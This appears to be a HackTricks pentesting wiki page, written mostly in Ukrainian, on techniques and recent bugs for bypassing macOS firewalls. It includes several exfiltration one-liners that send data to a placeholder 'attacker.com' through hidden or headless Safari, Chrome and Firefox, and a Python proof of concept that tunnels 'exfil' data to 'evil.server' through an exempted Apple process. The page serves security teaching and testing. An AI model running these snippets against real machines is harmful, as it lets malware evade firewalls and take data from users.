# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Знайдені техніки

Наступні техніки були виявлені як працюючі в деяких програмах брандмауера macOS.

### Зловживання іменами у білому списку

- Наприклад, викликати шкідливе ПЗ з іменами відомих процесів macOS, таких як **`launchd`**

### Синтетичний клік

- Якщо брандмауер запитує дозвіл у користувача, змусьте шкідливе ПЗ **натиснути на дозволити**

### **Використовуйте підписані Apple бінарні файли**

- Як **`curl`**, але також інші, такі як **`whois`**

### Відомі домени Apple

Брандмауер може дозволяти з'єднання з відомими доменами Apple, такими як **`apple.com`** або **`icloud.com`**. І iCloud може бути використаний як C2.

### Загальний обхід

Деякі ідеї для спроби обійти брандмауери

### Перевірка дозволеного трафіку

Знання дозволеного трафіку допоможе вам виявити потенційно включені до білого списку домени або які програми мають доступ до них.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Зловживання DNS

DNS-резолюції виконуються через **`mdnsreponder`** підписаний додаток, який, ймовірно, буде дозволено контактувати з DNS-серверами.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Через браузерні додатки

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Впровадження коду через процеси

Якщо ви можете **впровадити код у процес**, який має право підключатися до будь-якого сервера, ви можете обійти захист брандмауера:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Недавні вразливості обходу брандмауера macOS (2023-2025)

### Обхід фільтра веб-контенту (Screen Time) – **CVE-2024-44206**
У липні 2024 року Apple виправила критичну помилку в Safari/WebKit, яка зламала системний “фільтр веб-контенту”, що використовується батьківським контролем Screen Time.
Спеціально підготовлений URI (наприклад, з подвоєним URL-кодом “://”) не розпізнається ACL Screen Time, але приймається WebKit, тому запит надсилається без фільтрації. Будь-який процес, який може відкрити URL (включаючи пісочницю або непідписаний код), може таким чином досягати доменів, які явно заблоковані користувачем або профілем MDM.

Практичний тест (непоправлена система):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Помилка порядку правил фільтра пакетів (PF) у ранньому macOS 14 “Sonoma”
Під час бета-циклу macOS 14 Apple ввела регресію в обгортку користувацького простору навколо **`pfctl`**. 
Правила, які були додані з ключовим словом `quick` (використовуються багатьма VPN kill-switchами), були тихо проігноровані, що призвело до витоків трафіку, навіть коли GUI VPN/фаєрволу повідомляв *заблоковано*. Помилка була підтверджена кількома постачальниками VPN і виправлена в RC 2 (збірка 23A344).

Швидка перевірка витоків:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Зловживання службами допомоги, підписаними Apple (старі версії – до macOS 11.2)
Перед macOS 11.2 **`ContentFilterExclusionList`** дозволяв ~50 бінарних файлів Apple, таких як **`nsurlsessiond`** та App Store, обходити всі фаєрволи на основі фільтрації сокетів, реалізовані за допомогою фреймворку Network Extension (LuLu, Little Snitch тощо). 
Шкідливе ПЗ могло просто запустити виключений процес — або впровадити в нього код — і тунелювати свій трафік через вже дозволений сокет. Apple повністю видалила список виключень у macOS 11.2, але техніка все ще актуальна на системах, які не можуть бути оновлені.

Приклад доказу концепції (до 11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
---

## Поради щодо інструментів для сучасного macOS

1. Перевірте поточні правила PF, які генерують графічні брандмауери:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Перерахуйте двійкові файли, які вже мають право *outgoing-network* (корисно для підключення):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Програмно зареєструйте свій власний фільтр контенту мережевого розширення в Objective-C/Swift.
Мінімальний безкореневий PoC, який пересилає пакети на локальний сокет, доступний у вихідному коді **LuLu** Патрика Уордела.

## Посилання

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>

{{#include ../../banners/hacktricks-training.md}}
